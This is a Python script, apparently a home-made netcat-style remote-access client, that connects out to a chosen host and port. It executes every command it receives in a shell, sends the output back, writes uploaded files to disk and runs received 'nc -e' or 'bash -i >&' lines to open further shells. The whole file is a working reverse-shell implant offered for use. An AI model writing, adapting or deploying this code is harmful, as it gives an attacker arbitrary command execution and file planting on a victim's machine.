#!/usr/bin/env python3
import socket
import sys, os, time
import subprocess

class netcatCli(object):
    clientHandler = False
    port = 4444
    target = ""
    bufferSize = 2**12



    def usageOff(self):
        print("""
        tamXX Tool :\n
        [OPTIONS] :
        \t\t--target [IP]\t\t\t-     target
        \t\t-p , --port [PORT]\t\t\t-     port
        \t\t--prompt\t\t\t-     initialize prompt
        \t\t-h , --help\t\t\t-     get some help ;)
        """)
        sys.exit()



    def main(self):
        args = sys.argv
        listArgs = " ".join(args[1:]).split('-')
        while ("" in listArgs):
            listArgs.remove("")
        newListArgs = []
        for arg in listArgs:
            arg = arg.replace(' ','%')
            newListArgs.append(arg)
        listArgs = newListArgs

        if not len(sys.argv[1:]):
            self.usageOff()
        for opt in listArgs:
            if opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
                self.usageOff()
            elif "p%" in opt or "port%" in opt:
                opts = opt.split("%")
                self.port = int(opts[1])
            elif "target%" in opt:
                opts = opt.split("%")
                self.target = opts[1]
            elif opt == "prompt%" or opt == "prompt":
                self.clientHandler = True
            else:
                print("ERROR")
                self.usageOff()

        if self.clientHandler:
            self.clientLoop()
        else:
            print('ERROR')



    def clientLoop(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.target,self.port))
        except ConnectionRefusedError:
            print("Connection refused on host (maybe port incorrect !)")
            sys.exit()
        while True:
            recv = s.recv(self.bufferSize)
            recv = recv.decode('utf-8')
            if 'cd' in recv:
                recv = recv.split(' ')
                param = ''.join(recv[1:])
                try:
                    os.chdir(param)
                    s.send(os.getcwd().encode())
                except:
                    s.send(b"This folder doesn't exist")
            elif "exit" in recv or "quit" in recv:
                s.close()
                break
            elif 'whoami' in recv or "pwd" in recv:
                output = subprocess.getoutput(recv)
                s.send(output.encode())
            elif "upload" in recv:
                recv = recv.split(' ')[1:]
                filesize = recv[0]
                filename = recv[1]
                print(filename)
                if ";" in filename:
                    filename = filename.replace(";",'.')
                self.download(s,filename,filesize)
            elif 'nc -e' in recv or 'bash -i >&' in recv:
                os.system(recv)
                s.send(b"\n[*] OPEN NEW SHELL\n")
            else:

                output = recv+'\n\n'
                output = subprocess.getoutput(recv)+ '\n'
                s.send(output.encode())

                #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                #s.send(CMD.stdout.read())
                #s.send(CMD.stderr.read())

    def download(self,conn,dest,size):
        bufferSize = 2**18
        try:
            f=open(dest,"w",encoding="utf-8")
            data = conn.recv(int(size)).decode()
            print(data)
            f.write(data)
            conn.send(b"UPLOADED COMPLETE")
            f.close()
        except PermissionError:
            conn.send(b"you can\'t upload here ! ")
if __name__ == "__main__":
   ncat = netcatCli()
   ncat.main()
